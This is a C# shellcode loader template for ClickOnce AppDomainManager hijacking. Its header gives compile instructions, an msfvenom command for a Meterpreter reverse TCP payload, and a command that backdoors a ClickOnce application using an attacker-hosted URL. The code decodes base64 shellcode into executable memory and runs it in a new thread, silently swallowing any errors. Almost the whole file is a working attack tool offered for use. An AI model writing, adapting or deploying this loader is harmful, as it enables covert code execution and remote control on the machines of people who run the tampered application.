/*
 * ClickOnce AppDomainManager Injection — Shellcode Loader
 * ========================================================
 * Payload that decodes base64 shellcode and executes it via
 * VirtualAlloc + copy + CreateThread when the target ClickOnce
 * application loads via AppDomainManager hijacking.
 *
 * Placeholders (replaced by clickonce_backdoor.py):
 *   {CLASSNAME}  — AppDomainManager class name (must match .exe.config)
 *   {SHELLCODE}  — Base64-encoded raw shellcode bytes
 *
 * Compile:
 *   csc.exe /t:library /platform:x86 /out:Payload.dll ShellcodeLoader.cs
 *
 *   For x64 targets:
 *   csc.exe /t:library /platform:x64 /out:Payload.dll ShellcodeLoader.cs
 *
 * Generate shellcode (example with msfvenom):
 *   msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=443 -f raw -o shell.bin
 *
 * Then:
 *   python clickonce_backdoor.py --input ./App.application --url http://ATTACKER/App --shellcode shell.bin
 */

using System;
using System.Runtime.InteropServices;
using System.Threading;

public sealed class {CLASSNAME} : AppDomainManager
{
    private static int _init = 0;
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        if (Interlocked.Exchange(ref _init, 1) != 0) return;
        var t = new Thread(() =>
        {
            try
            {
                Thread.Sleep(2000);
                ShellcodeRunner.Execute();
            }
            catch { }
        });
        t.IsBackground = false;
        t.Start();
    }
}

public class ShellcodeRunner
{
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static bool Execute()
    {
        byte[] sc = Convert.FromBase64String("{SHELLCODE}");

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (addr == IntPtr.Zero) return false;

        Marshal.Copy(sc, 0, addr, sc.Length);

        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, out threadId);
        if (hThread == IntPtr.Zero) return false;

        WaitForSingleObject(hThread, 0xFFFFFFFF);
        return true;
    }
}
